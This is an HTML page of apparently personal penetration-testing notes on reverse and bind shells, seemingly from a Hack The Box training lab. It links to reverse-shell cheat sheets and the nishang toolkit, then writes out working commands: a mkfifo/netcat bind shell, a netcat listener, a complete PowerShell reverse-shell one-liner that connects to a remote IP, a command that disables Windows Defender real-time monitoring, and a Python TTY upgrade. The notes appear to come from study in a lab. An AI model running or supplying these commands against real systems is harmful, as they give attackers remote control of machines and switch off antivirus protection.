<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Shells</title>
</head><body>reverse &amp; bind shells:<ul><li style="list-style-type: none">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li>
</ul>
<br/>
<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">payloads:</a><ul><li style="list-style-type: none"><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">nishang/Shells/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang · GitHub</a>&nbsp; </li>
</ul>
<br/>
Bind Shell (generally worse cuase of IDS - listening for incoming that might be blocked)<br/>
<br/>
Shell bin/bash linux<ul><li style="list-style-type: none">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</li>
</ul>
<br/>
Reverse Shell<ul><li style="list-style-type: none">sarting listener of our terminal:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">nc -lvnp 0.0.0.0 443 &nbsp;(443 cause chances are low its blocked by ips)</li>
<li style="list-style-type: none"></li>
</ul>
</li>
<li style="list-style-type: none">connecting from target:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Windows PS: (win+r) im command prompt dann das:</li>
</ul>
</li>
</ul>
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.31',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
</ul>
</li>
<li style="list-style-type: none">Windows AV deactivation. Run PS as admin -&gt; then</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\Users\htb-student&gt; Set-MpPreference -DisableRealtimeMonitoring $true</li>
</ul>
</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
</li>
</ul>
Get a functioning shell (TTY)<ul><li style="list-style-type: none">python -c 'import pty; pty.spawn("/bin/sh")'</li>
</ul>
</body></html>